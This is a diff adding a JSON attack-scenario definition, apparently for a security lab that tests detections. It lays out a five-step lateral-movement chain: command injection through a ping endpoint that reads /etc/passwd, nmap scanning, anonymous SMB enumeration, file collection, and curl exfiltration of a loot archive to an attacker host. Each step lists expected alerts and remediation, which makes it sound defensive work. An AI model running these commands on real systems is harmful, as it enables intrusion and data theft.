@@ -1,0 +1,143 @@
+{
+  "id": "lateral-movement-data-theft",
+  "name": "Lateral Movement and Sensitive Data Theft",
+  "description": "Starting from a compromised web server in the DMZ, the attacker pivots to internal systems, discovers file shares with sensitive data, and exfiltrates employee PII and financial records.",
+  "difficulty": "intermediate",
+  "estimated_time_minutes": 35,
+  "attack_chain": "Web Shell -> Internal Pivot -> Share Discovery -> Data Collection -> Exfil",
+  "prerequisites": ["wazuh", "enterprise", "kali", "fileshare"],
+  "mitre_tactics": ["Execution", "Discovery", "Lateral Movement", "Collection", "Exfiltration"],
+  "mitre_techniques": ["T1059.004", "T1046", "T1135", "T1039", "T1048.002"],
+  "steps": [
+    {
+      "step_number": 1,
+      "technique": {
+        "technique_id": "T1059.004",
+        "technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic": "Execution",
+        "description": "Obtain command execution on the web server via command injection in the ping tool.",
+        "target": "webapp",
+        "commands": [
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=127.0.0.1;whoami'",
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=127.0.0.1;cat /etc/passwd'"
+        ],
+        "prerequisites": []
+      },
+      "expected_detections": [
+        {
+          "source": "wazuh",
+          "rule_id": "302030",
+          "rule_group": "command_injection",
+          "description": "Command injection attempt via web application",
+          "severity": "critical",
+          "max_detection_time_seconds": 10
+        }
+      ],
+      "investigation_hints": ["Check web application logs for command injection patterns"],
+      "remediation": ["Disable the vulnerable endpoint", "Input validation"]
+    },
+    {
+      "step_number": 2,
+      "technique": {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "Discovery",
+        "description": "From the compromised web server, scan the internal network to discover services. The web server is on both DMZ and internal networks.",
+        "target": "internal",
+        "commands": [
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=127.0.0.1;for i in $(seq 1 30); do ping -c 1 -W 1 172.20.2.$i; done'",
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=127.0.0.1;nmap -sT -p 445,139,22,389 172.20.2.0/24 2>&1'"
+        ],
+        "prerequisites": ["T1059.004"]
+      },
+      "expected_detections": [
+        {
+          "source": "suricata",
+          "rule_id": "303010",
+          "rule_group": "recon",
+          "description": "Network scanning from DMZ host to internal network",
+          "severity": "high",
+          "max_detection_time_seconds": 30
+        },
+        {
+          "source": "suricata",
+          "rule_id": "1000070",
+          "description": "Lateral movement - connection from DMZ to internal",
+          "severity": "high",
+          "max_detection_time_seconds": 15
+        }
+      ],
+      "investigation_hints": ["Check for internal scanning from DMZ hosts", "Review Suricata alerts for lateral movement"],
+      "remediation": ["Segment networks more strictly", "Block unnecessary DMZ-to-internal traffic"]
+    },
+    {
+      "step_number": 3,
+      "technique": {
+        "technique_id": "T1135",
+        "technique_name": "Network Share Discovery",
+        "tactic": "Discovery",
+        "description": "Discover SMB file shares on the internal network.",
+        "target": "fileshare",
+        "commands": [
+          "smbclient -L //172.20.2.12/ -N",
+          "smbclient -L //172.20.2.12/ -U 'guest%guest'"
+        ],
+        "prerequisites": ["T1046"]
+      },
+      "expected_detections": [
+        {
+          "source": "suricata",
+          "rule_id": "1000050",
+          "description": "SMB enumeration detected",
+          "severity": "medium",
+          "max_detection_time_seconds": 15
+        }
+      ],
+      "investigation_hints": ["Check SMB logs for anonymous or guest access attempts"],
+      "remediation": ["Disable anonymous share listing", "Require authentication for all shares"]
+    },
+    {
+      "step_number": 4,
+      "technique": {
+        "technique_id": "T1039",
+        "technique_name": "Data from Network Shared Drive",
+        "tactic": "Collection",
+        "description": "Access publicly readable shares and collect sensitive files (credentials, employee PII, financial data).",
+        "target": "fileshare",
+        "commands": [
+          "smbclient //172.20.2.12/Public -N -c 'ls'",
+          "smbclient //172.20.2.12/Shared -N -c 'get wifi-passwords.txt; get meeting-notes-q3.txt'"
+        ],
+        "prerequisites": ["T1135"]
+      },
+      "expected_detections": [],
+      "investigation_hints": ["Check file access logs on the file server", "Look for bulk file downloads"],
+      "remediation": ["Remove sensitive files from public shares", "Implement access controls"]
+    },
+    {
+      "step_number": 5,
+      "technique": {
+        "technique_id": "T1048.002",
+        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+        "tactic": "Exfiltration",
+        "description": "Transfer collected files back to the Kali box via the web server pivot.",
+        "target": "kali",
+        "commands": [
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=127.0.0.1;curl -X POST http://172.20.4.30:8888/ -d @/tmp/loot.tar.gz'"
+        ],
+        "prerequisites": ["T1039"]
+      },
+      "expected_detections": [
+        {
+          "source": "suricata",
+          "rule_id": "1000090",
+          "description": "Outbound connection to suspicious port",
+          "severity": "high",
+          "max_detection_time_seconds": 15
+        }
+      ],
+      "investigation_hints": ["Check for unusual outbound connections from internal hosts", "Review data transfer volumes"],
+      "remediation": ["Block outbound traffic from servers to non-standard ports", "Implement DLP"]
+    }
+  ]
+}
